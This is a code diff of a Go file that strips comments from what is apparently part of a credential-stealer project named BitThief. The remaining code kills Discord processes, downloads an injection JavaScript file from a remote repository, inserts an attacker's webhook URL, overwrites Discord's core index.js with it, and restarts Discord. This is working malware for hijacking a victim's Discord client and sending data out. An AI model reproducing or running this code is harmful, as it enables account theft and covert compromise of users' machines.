@@ -13,11 +13,9 @@ import (
 	"github.com/shirou/gopsutil/v3/process"
 )
 
-// killDiscordProcesses iterates through all processes and kills any process whose name contains "discord" (case insensitive).
 func killDiscordProcesses() {
 	procs, err := process.Processes()
 	if err != nil {
-		// Optionally log or handle error; here we just return.
 		return
 	}
 
@@ -28,17 +26,12 @@ func killDiscordProcesses() {
 		}
 
 		if strings.Contains(strings.ToLower(name), "discord") {
-			// Attempt to kill the process; ignore errors.
 			_ = proc.Kill()
 		}
 	}
 }
 
-// InjectDiscord downloads the injection script, kills any running Discord processes via gopsutil,
-// injects the code into Discord’s core, and restarts Discord. The provided webhook URL is
-// inserted into the injection code.
 func InjectDiscord(webhook string) error {
-	// Get LOCALAPPDATA and build list of possible Discord directories.
 	localAppData := os.Getenv("LOCALAPPDATA")
 	if localAppData == "" {
 		return fmt.Errorf("LOCALAPPDATA environment variable not set")
@@ -50,7 +43,6 @@ func InjectDiscord(webhook string) error {
 		filepath.Join(localAppData, "DiscordDevelopment"),
 	}
 
-	// Download the injection JavaScript code.
 	url := "https://raw.githubusercontent.com/greenstorm5417/BitThief/refs/heads/main/injection/injection.js"
 	resp, err := http.Get(url)
 	if err != nil {
@@ -64,10 +56,8 @@ func InjectDiscord(webhook string) error {
 	}
 	code := string(codeBytes)
 
-	// Kill all Discord processes using gopsutil.
 	killDiscordProcesses()
 
-	// Iterate over each potential Discord installation directory.
 	for _, dir := range discordDirs {
 		if _, err := os.Stat(dir); os.IsNotExist(err) {
 			continue
@@ -75,23 +65,18 @@ func InjectDiscord(webhook string) error {
 
 		corePath, version, err := getCore(dir)
 		if err != nil || corePath == "" {
-			// Skip this directory if the core wasn’t found.
 			continue
 		}
 
-		// Replace placeholders in the injection code.
 		modifiedCode := strings.ReplaceAll(code, "discord_desktop_core-1", version)
 		modifiedCode = strings.ReplaceAll(modifiedCode, "%WEBHOOK%", webhook)
 
 		indexPath := filepath.Join(corePath, "index.js")
 		if err := os.WriteFile(indexPath, []byte(modifiedCode), 0644); err != nil {
-			// If writing fails, skip to the next directory.
 			continue
 		}
 
-		// Restart Discord using the Update.exe mechanism.
 		if err := startDiscord(dir); err != nil {
-			// If restarting fails, continue on to the next directory.
 			continue
 		}
 	}
@@ -99,10 +84,6 @@ func InjectDiscord(webhook string) error {
 	return nil
 }
 
-// getCore searches for a Discord "core" folder inside the provided directory.
-// It looks for a subdirectory starting with "app-" and then inside its "modules" folder
-// for a directory beginning with "discord_desktop_core". If found, it returns the full path
-// to the "discord_desktop_core" folder and the module folder name (which is used as the version).
 func getCore(dir string) (string, string, error) {
 	entries, err := os.ReadDir(dir)
 	if err != nil {
@@ -110,7 +91,6 @@ func getCore(dir string) (string, string, error) {
 	}
 
 	for _, entry := range entries {
-		// Look for directories whose name starts with "app-"
 		if entry.IsDir() && strings.HasPrefix(entry.Name(), "app-") {
 			appDir := filepath.Join(dir, entry.Name())
 			modulesDir := filepath.Join(appDir, "modules")
@@ -125,7 +105,6 @@ func getCore(dir string) (string, string, error) {
 
 			re := regexp.MustCompile("^discord_desktop_core")
 			for _, modEntry := range modEntries {
-				// Look for a module whose name starts with "discord_desktop_core".
 				if !re.MatchString(modEntry.Name()) {
 					continue
 				}
@@ -141,16 +120,11 @@ func getCore(dir string) (string, string, error) {
 		}
 	}
 
-	// If not found, return an empty result.
 	return "", "", nil
 }
 
-// startDiscord attempts to restart Discord from the specified directory.
-// It looks for a subfolder starting with "app-" that contains the Discord executable,
-// then calls Update.exe with the "--processStart" argument to restart it.
 func startDiscord(dir string) error {
 	updatePath := filepath.Join(dir, "Update.exe")
-	// The executable name is derived from the Discord folder name (e.g. "Discord.exe").
 	exeName := filepath.Base(dir) + ".exe"
 
 	entries, err := os.ReadDir(dir)
@@ -159,7 +133,6 @@ func startDiscord(dir string) error {
 	}
 
 	for _, entry := range entries {
-		// Look for directories that start with "app-"
 		if entry.IsDir() && strings.HasPrefix(entry.Name(), "app-") {
 			appDir := filepath.Join(dir, entry.Name())
 			modulesPath := filepath.Join(appDir, "modules")
@@ -167,7 +140,6 @@ func startDiscord(dir string) error {
 				continue
 			}
 
-			// Look for the Discord executable within the app folder.
 			appEntries, err := os.ReadDir(appDir)
 			if err != nil {
 				continue
@@ -176,7 +148,6 @@ func startDiscord(dir string) error {
 			for _, appEntry := range appEntries {
 				if !appEntry.IsDir() && appEntry.Name() == exeName {
 					executable := filepath.Join(appDir, exeName)
-					// Call Update.exe with "--processStart" and the path to the executable.
 					cmd := exec.Command(updatePath, "--processStart", executable)
 					return cmd.Run()
 				}
